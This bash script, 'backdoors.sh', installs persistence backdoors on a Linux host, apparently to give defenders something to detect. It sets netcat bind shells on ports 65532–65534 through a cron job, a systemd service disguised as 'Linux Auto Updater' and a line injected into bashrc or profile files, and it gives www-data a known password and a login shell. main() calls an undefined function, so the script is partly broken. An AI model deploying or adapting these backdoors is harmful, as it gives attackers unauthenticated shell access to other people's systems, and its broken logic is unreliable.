#!/bin/bash

# ==============================================================================
# Script Name: backdoors.sh
# Description: Tries to create easily detectable backdoors using different methods.
# Version: 1.0.0
# Author: mind2hex
# Date: 2024-11-18
# License: GPLv3
# ==============================================================================

# Exit immediately if a command exits with a non-zero status
set -e

# Treat unset variables as an error when substituting
set -u

# Function to show version
show_version() {
    echo "$0 version 1.0.0"
    exit 0
}

# Function to handle errors
error_exit() {
    echo "Error: $1" >&2
    exit 1
}

# 
#infect_service_configuration

create_malicious_cronjob(){
    # PORT 65532
    echo "* * * * * /usr/bin/nc -lvnp 65532 -e /bin/bash" | crontab -
}

# Creates a System/User level malicious service that starts a listener
create_malicious_service(){
    # PORT 65533
    service_config="
[Unit]
Description=Linux Auto Updater
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/bin/nc -lvnp 65533 -e /bin/bash
Restart=always
RestartSec=20
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
    "
    linger=$(loginctl show-user $USER | grep --ignore-case linger | cut -d "=" -f 2)
    if [[ $EUID -eq 0 ]];then
        # Create system malicious service
        echo "${service_config}" > /etc/systemd/system/system-update.service
        systemctl daemon-reload
        systemctl enable system-update.service
        systemctl start system-update.service
    else
        # Create user-level malicious service
        mkdir -p ~/.config/systemd/user
        echo "${service_config}" > ~/.config/systemd/user/system-update.service
        systemctl --user daemon-reload
        systemctl --user enable system-update.service
        systemctl --user start  system-update.service
    fi
}

# Modify a system account to enable shell login 
infect_default_system_account(){
    if [[ $EUID -ne 0 ]];then
        return
    fi

    # Modify a system user creating a custom password and enabling shell use
    # www-data:backdoor 
    usermod --password '$6$U7D5xBMmqCRkIZGx$fvlgOsi7WHPZ2uZbmyH8Y9.gfo3xwWvU1Gfh61a7AtxrswC1xLhe1I5IIOiCYeMZCsujExacrkJEjhLz8YWa.1' -s /bin/bash www-data
}

# Infect bash environment file
infect_bash_environment_file() {
    # PORT 65534
    instruction='nohup bash -c "while true; do nc -lvnp 65534 -e /bin/bash > /dev/null 2>&1; done" > /dev/null 2>&1 &'
    # Infecting user environment file
    if [[ -e /etc/bash.bashrc && $EUID -eq 0 ]];then
        # Inserting instruction in the start of file /etc/bash.bashrc
        # default configuration for bashrc
        if ! grep "$instruction" /etc/bash.bashrc;then
            sed -i "1i $instruction" /etc/bash.bashrc
        fi

    elif [[ -e /etc/bash_completion && $EUID -eq 0 ]];then
        # Inserting instruction in the start of file /etc/bash_completion
        # default configuration for bashrc
        if ! grep "$instruction" /etc/bash_completion;then
            sed -i "1i $instruction" /etc/bash_completion
        fi

    elif [[ -e ~/.bashrc ]];then
        # Inserting instruction in the start of file ~/.bashrc
        # individual bash configuration file for every user
        if ! grep "$instruction" ~/.bashrc;then
            sed -i "1i $instruction" ~/.bashrc
        fi

    elif [[ -e ~/.profile ]];then
        # Inserting instruction in the start of file ~/.profile
        # individual bash configuration file for every user
        if ! grep "$instruction" ~/.profile;then
            sed -i "1i $instruction" ~/.profile
        fi
    fi
}


# Main logic of the script
main() {
    infect_bash_environment_file
    infect_default_system_account
    infect_service_configuration
    create_malicious_cronjob
    create_malicious_service
}

# Run the main function
main
